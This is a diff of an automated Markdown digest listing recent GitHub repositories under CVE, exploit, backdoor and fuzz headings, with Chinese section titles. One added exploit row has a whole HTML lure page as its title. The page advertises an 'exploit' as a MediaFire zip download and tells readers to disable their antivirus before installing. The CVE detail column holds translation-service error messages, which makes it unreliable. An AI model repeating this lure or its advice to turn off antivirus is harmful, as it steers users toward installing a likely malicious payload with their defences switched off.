@@ -18,7 +18,7 @@
 # CVE Github 推荐
 | ts | cve_id | title | url | cve_detail| 
 | --- | --- | --- | --- | ---| 
-| 20200912T12:43:20Z | CVE-2020-1472 | Test tool for CVE-2020-1472 | https://github.com/SecuraBV/CVE-2020-1472 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 15 MINUTES 42 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
+| 20200912T12:43:20Z | CVE-2020-1472 | Test tool for CVE-2020-1472 | https://github.com/SecuraBV/CVE-2020-1472 | MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY. NEXT AVAILABLE IN  10 HOURS 14 MINUTES 41 SECONDSVISIT HTTPS://MYMEMORY.TRANSLATED.NET/DOC/USAGELIMITS.PHP TO TRANSLATE MORE| 
 | 20200912T05:32:03Z | 未知编号 | CVE Data Analysis, CVE Monitor, CVE EXP Prediction Based on Deep Learning. 1999-2020年存量CVE数据分析、监控CVE增量更新、基于深度学习的CVE EXP预测和自动化推送 | https://github.com/404notf0und/CVE-Flow | 未查询到CVE信息| 
 
 
@@ -35,6 +35,7 @@
 # exploit on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
+| 20200912T12:39:51Z | <!DOCTYPE html> <html lang=%en%>   <head>         <link href=%https://fonts.googleapis.com/css?family=Sofia% rel=%stylesheet%>     <style> lesk2 {     font-family: %Sofia%;font-size: 22px; } </style>     <meta charset=%utf-8% />     <meta http-equiv=%X-UA-Compatible% content=%IE=edge% />     <meta name=%viewport% content=%width=device-width, initial-scale=1% />      <title>Hello!</title>     <link       rel=%shortcut icon%       type=%image/png%       href=%https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Video-Game-Controller-Icon.svg/1024px-Video-Game-Controller-Icon.svg.png%     />     <link       rel=%shortcut icon%       type=%image/png%       href=%https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Video-Game-Controller-Icon.svg/1024px-Video-Game-Controller-Icon.svg.png%     />      <link rel=%stylesheet% href=%/style.css% />      <script src=%/script.js% defer></script>   </head>   <body>     <h1>Hi there!</h1>     <p class=%thick%>       EspoRRepo - A Revolutionary Exploit       <hr>       <button class=%button button4%>         <a href=%https://download1074.mediafire.com/hnqw84xmbesg/sel0t8rsbs7ym08/compress.zip% style=%text-decoration:none;%>        EspoRRepo - A Revolutionary Exploit</a>       </button>     </p>       <h2 class=%b%>       EspoRRepo - A Revolutionary Exploit     </h2>   <hr class=%hidden%/>   <lesk2>   <h2>     Experiencing bugs? Disable your antivirus and try     installing again.   </h2>     </lesk2>   <link href=%https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@300;400;700&display=swap% rel=%stylesheet%>   <link href=%https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@700&display=swap% rel=%stylesheet%>       <style> lesk {     font-family: %Kumbh Sans%;font-size: 22px; } </style>         <style> lesked {     font-family: %Kumbh Sans%;font-size: 22px; } </style>   <lesk>         <h1> KesYest Executor (Kes, Yes-t) </h1>         </lesk>   <lesked>     <h1>        Brand Executor, Yesk Executor     </h1>           </lesked>   </body> </html> | https://github.com/GFreeExpYejYestyEK/YanEx | 0 | 0| 
 | 20200912T12:35:01Z | ROBLOX Lua Wrapper made with Lua 5.1 Just-In-Time compiler | https://github.com/yuukixdev/LuaJIT-Wrapper | 0 | 0| 
 | 20200912T12:29:22Z | Jing Lou*, Huan Wang, Longtao Chen, Fenglei Xu, Qingyuan Xia, Wei Zhu, Mingwu Ren*, %Exploiting Color Name Space for Salient Object Detection,% Multimedia Tools and Applications, vol. 79, no. 15, pp. 10873-10897, 2020. | https://github.com/jinglou/p2019-cns-sod | 0 | 0| 
 | 20200912T12:24:33Z | Null | https://github.com/quentin452/Cats-Exploitz-HUB | 0 | 1| 
@@ -44,7 +45,6 @@
 | 20200912T11:28:43Z | Null | https://github.com/royanpng2/ExploitKey123 | 0 | 0| 
 | 20200912T11:26:45Z | Key | https://github.com/royanpng2/KeyForExploit | 0 | 0| 
 | 20200912T10:36:31Z | A faithful recreation of the Windows 96 exploitation system. | https://github.com/beurkinger/windows-96 | 0 | 0| 
-| 20200912T10:29:29Z | An unsupervised method that combines Transformers and Capsule Networks to exploit spatial relations of different parts of an image. | https://github.com/karayanni/Stacked-Capsule-Autoencoder | 0 | 0| 
 
 
 # backdoor on Github 推荐
@@ -58,7 +58,7 @@
 # fuzz on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
-| 20200912T12:42:36Z | Null | https://github.com/WarNote/fuzzySearchTests | 0 | 0| 
+| 20200912T12:45:58Z | Null | https://github.com/WarNote/fuzzySearchTests | 0 | 0| 
 | 20200912T12:26:13Z | Take the current implementation and turning a microservice architecture | https://github.com/ccesarrod/FuzzyMicrosrvices | 0 | 0| 
 | 20200912T12:18:04Z | A simple fuzzer search that allows you to select a active docker container and a command to execute on it | https://github.com/kb05/docker-fuzzy-executer | 0 | 0| 
 | 20200912T12:10:55Z | Null | https://github.com/Kapp1/fuzzy-octo | 0 | 0| 
